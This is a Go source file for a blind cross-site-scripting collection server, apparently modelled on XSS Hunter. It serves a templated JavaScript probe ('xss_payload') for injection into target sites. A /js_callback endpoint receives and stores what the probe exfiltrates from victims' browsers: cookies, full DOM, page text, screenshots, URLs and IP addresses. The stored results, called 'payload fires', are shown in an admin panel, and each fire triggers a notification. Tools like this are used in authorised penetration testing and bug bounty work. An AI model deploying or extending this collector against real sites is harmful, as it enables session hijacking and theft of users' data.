package main

import (
	"bytes"
	"compress/gzip"
	"fmt"
	"io"
	"os"
	"regexp"
	"strconv"

	"net/http"

	"github.com/google/uuid"
)

func main() {
	fmt.Println("Initializing...")
	initalize_constant()
	initialize_database()
	PrintVersion()
	fmt.Println("Initialized")
	make_folder_if_not_exists(get_screenshot_directory())

	http.HandleFunc("/", probeHandler)
	http.HandleFunc("/js_callback", jscallbackHandler)
	http.HandleFunc("/health", healthHandler)
	http.HandleFunc("/screenshots/", screenshotHandler)

	CONTROL_PANEL_ENABLED := get_env("CONTROL_PANEL_ENABLED")
	if CONTROL_PANEL_ENABLED == "show" || CONTROL_PANEL_ENABLED == "true" {
		fmt.Println("Control Panel Enabled")
		http.HandleFunc("/admin", adminHandler)
		http.HandleFunc(API_BASE_PATH+"/auth-check", authCheckHandler)
		http.HandleFunc(API_BASE_PATH+"/settings", settingsHandler)
		http.HandleFunc(API_BASE_PATH+"/login", loginHandler)
		http.HandleFunc(API_BASE_PATH+"/payloadfires", payloadFiresHandler)
		http.HandleFunc(API_BASE_PATH+"/collected_pages", collectedPagesHandler)
		http.HandleFunc(API_BASE_PATH+"/record_injection", recordInjectionHandler)
		http.HandleFunc(API_BASE_PATH+"/version", versionHandler)
	}

	fmt.Println("Server is starting on port 1449...")
	if err := http.ListenAndServe(":1449", nil); err != nil {
		fmt.Println("Error starting server:", err)
	}
}

func set_secure_headers(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("X-XSS-Protection", "mode=block")
	w.Header().Set("X-Content-Type-Options", "nosniff")
	w.Header().Set("X-Frame-Options", "DENY")

	if r.URL.Path[:4] == "/api" {
		w.Header().Set("Content-Security-Policy", "default-src 'none'; script-src 'none'")
		w.Header().Set("Content-Type", "application/json")
	}
}

func set_payload_headers(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Security-Policy", "default-src 'none'; script-src 'none'")
	w.Header().Set("Content-Type", "application/javascript")
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Methods", "GET, OPTIONS")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type, X-Requested-With")
	w.Header().Set("Access-Control-Max-Age", "86400")
}

func set_callback_headers(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Methods", "POST, OPTIONS")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type, X-Requested-With")
	w.Header().Set("Access-Control-Max-Age", "86400")
}

func set_no_cache(w http.ResponseWriter) {
	w.Header().Set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
	w.Header().Set("Pragma", "no-cache")
}

type JSCallbackSchema struct {
	URI          string `json:"uri"`
	Cookies      string `json:"cookies"`
	Referrer     string `json:"referrer"`
	UserAgent    string `json:"user-agent"`
	BrowserTime  string `json:"browser-time"`
	ProbeUID     string `json:"probe-uid"`
	Origin       string `json:"origin"`
	InjectionKey string `json:"injection_key"`
	Title        string `json:"title"`
	Text         string `json:"text"`
	WasIframe    string `json:"was_iframe"`
	DOM          string `json:"dom"`
}

func jscallbackHandler(w http.ResponseWriter, r *http.Request) {
	set_callback_headers(w, r)

	body, err := io.ReadAll(r.Body)
	if err != nil {
		fmt.Println(err)
		return
	}

	// Send the response immediately, they don't need to wait for us to store everything.
	w.Write([]byte("OK"))

	// Go routine to close the connection and process the data
	go func(body []byte, ip_address string, host string) {
		r := &http.Request{
			Body:   io.NopCloser(bytes.NewReader(body)),
			Header: http.Header{"Content-Type": []string{r.Header.Get("Content-Type")}},
			Host:   host,
		}

		err := r.ParseMultipartForm(32 << 20)
		if err != nil {
			fmt.Println(err)
			return
		}

		payload_fire_image_id := uuid.New().String()
		payload_fire_image_filename := get_screenshot_directory() + "/" + payload_fire_image_id + ".png.gz"

		// Grabbing Image and saving it
		for _, files := range r.MultipartForm.File {
			for _, file := range files {
				fileContent, err := file.Open()
				if err != nil {
					fmt.Println(err)
					return
				}
				defer fileContent.Close()

				newFile, err := os.Create(payload_fire_image_filename)
				if err != nil {
					fmt.Println(err)
					return
				}
				defer newFile.Close()

				gw := gzip.NewWriter(newFile)
				defer gw.Close()

				_, err = io.Copy(gw, fileContent)
				if err != nil {
					fmt.Println(err)
					return
				}
			}
		}

		// payload_fire_id := uuid.New().String()
		r.ParseForm()
		browser_time, _ := strconv.ParseUint(r.FormValue("browser-time"), 10, 64)
		payload_fire_data := PayloadFireResults{
			// ID:                 payload_fire_id,
			Url:                r.FormValue("uri"),
			Ip_address:         ip_address,
			Referer:            r.FormValue("referrer"),
			User_agent:         r.FormValue("user-agent"),
			Cookies:            r.FormValue("cookies"),
			Title:              r.FormValue("title"),
			Dom:                r.FormValue("dom"),
			Text:               r.FormValue("text"),
			Origin:             r.FormValue("origin"),
			Screenshot_id:      payload_fire_image_id,
			Was_iframe:         r.FormValue("was_iframe") == "true",
			Browser_timestamp:  uint(browser_time),
			Correlated_request: "No correlated request found for this injection.",
		}

		db := establish_database_connection()

		var correlated_request_rec string
		db.QueryRow("SELECT request FROM injection_requests WHERE injection_key = ?", r.FormValue("injection_key")).Scan(&correlated_request_rec)
		if correlated_request_rec != "" {
			payload_fire_data.Correlated_request = correlated_request_rec
		}

		stmt, _ := db.Prepare(`INSERT INTO payload_fire_results (url, ip_address, referer, user_agent, cookies, title, dom, text, origin, screenshot_id, was_iframe, browser_timestamp) 
		VALUES (:url, :ip_address, :referer, :user_agent, :cookies, :title, :dom, :text, :origin, :screenshot_id, :was_iframe, :browser_timestamp)`)
		_, err = stmt.Exec(payload_fire_data.Url, payload_fire_data.Ip_address, payload_fire_data.Referer, payload_fire_data.User_agent, payload_fire_data.Cookies, payload_fire_data.Title, payload_fire_data.Dom, payload_fire_data.Text, payload_fire_data.Origin, payload_fire_data.Screenshot_id, payload_fire_data.Was_iframe, payload_fire_data.Browser_timestamp)
		if err != nil {
			fmt.Println("Error Inserting Payload Fire Data:", err)
			return
		}

		screenshot_url := generate_screenshot_url(r, payload_fire_image_id)
		send_notification("Payload Fire: A payload fire has been detected on "+payload_fire_data.Url, screenshot_url)
	}(body, get_client_ip(r), r.Host)
}

func probeHandler(w http.ResponseWriter, r *http.Request) {
	set_payload_headers(w, r)

	college_pages := get_pages_to_collect()
	chainload_uri := get_chainload_uri()
	probe_id := r.URL.Path[1:]

	probe, err := os.ReadFile("./probe.js")
	if err != nil {
		fmt.Println("Error reading file:", err)
	}

	host := get_host(r)

	re := regexp.MustCompile(`\[HOST_URL\]`)
	xss_payload_1 := re.ReplaceAllString(string(probe), host)

	re = regexp.MustCompile(`\[COLLECT_PAGE_LIST_REPLACE_ME\]`)
	xss_payload_2 := re.ReplaceAllString(xss_payload_1, college_pages)

	re = regexp.MustCompile(`\[CHAINLOAD_REPLACE_ME\]`)
	xss_payload_3 := re.ReplaceAllString(xss_payload_2, chainload_uri)

	re = regexp.MustCompile(`\[PROBE_ID\]`)
	xss_payload_4 := re.ReplaceAllString(xss_payload_3, probe_id)

	w.Write([]byte(xss_payload_4))
}

func adminHandler(w http.ResponseWriter, r *http.Request) {
	set_secure_headers(w, r)
	set_no_cache(w)
	is_authenticated := get_and_validate_jwt(r)
	if !is_authenticated {
		http.ServeFile(w, r, "./src/login.html")
	} else {
		http.ServeFile(w, r, "./src/admin.html")
	}
}

func healthHandler(w http.ResponseWriter, r *http.Request) {
	set_secure_headers(w, r)
	if establish_database_connection() != nil {
		w.Write([]byte("OK"))
	} else {
		w.WriteHeader(http.StatusInternalServerError)
	}
}

func screenshotHandler(w http.ResponseWriter, r *http.Request) {
	set_secure_headers(w, r)

	if get_env("SCREENSHOTS_REQUIRE_AUTH") == "true" {
		is_authenticated := get_and_validate_jwt(r)
		if !is_authenticated {
			http.Error(w, "Not authenticated", http.StatusUnauthorized)
			return
		}
	}

	screenshotFilename := r.URL.Path[len("/screenshots/"):]

	SCREENSHOT_FILENAME_REGEX := regexp.MustCompile(`^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-4[0-9a-fA-F]{3}-[89abAB][0-9a-fA-F]{3}-[0-9a-fA-F]{12}\.png$`)
	if !SCREENSHOT_FILENAME_REGEX.MatchString(screenshotFilename) {
		http.NotFound(w, r)
		return
	}

	gzImagePath := get_screenshot_directory() + "/" + screenshotFilename + ".gz"

	imageExists := checkFileExists(gzImagePath)

	if !imageExists {
		http.NotFound(w, r)
		return
	}

	w.Header().Set("Content-Type", "image/png")
	w.Header().Set("Content-Encoding", "gzip")

	http.ServeFile(w, r, gzImagePath)
}
